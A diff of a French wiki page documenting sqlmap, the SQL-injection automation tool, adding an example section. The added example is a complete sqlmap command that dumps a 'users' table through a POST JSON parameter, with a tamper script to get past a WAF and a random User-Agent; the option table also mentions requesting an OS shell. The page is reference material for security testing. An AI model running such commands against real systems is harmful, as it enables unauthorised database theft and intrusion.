@@ -2,7 +2,7 @@
 title: sqlmap
 description: Outil d'automatisation de détection et d'exploitation de failles SQLi (SQL Injection).
 published: true
-date: 2024-11-24T17:19:26.848Z
+date: 2024-11-24T17:39:58.657Z
 tags: outil, indépendant, synthèse
 editor: markdown
 dateCreated: 2024-11-23T16:26:24.352Z
@@ -78,6 +78,11 @@ sqlmap est un outil d'automatisation de détection et d'exploitation de failles 
 | `--os-shell`                        | Demande un shell interactif.                                                                                                                                                       |
 
 # Exemples
+
+Récupère la table "users" en utilisant une requête POST avec comme paramètre d'injection "id".
+De plus, le script d'altération between est utilisé pour contourner le WAF en plus d'utiliser une valeur aléatoire parmi une liste pour le champ User-agent.
+
+`sudo sqlmap -u http://192.168.1.1:4343/index.php?id=1 --batch --data='{"id":1}' --random-agent --method POST -H 'Content-Type:application/json' --dump --tamper between.py -T users`
 
 # Voir aussi
 
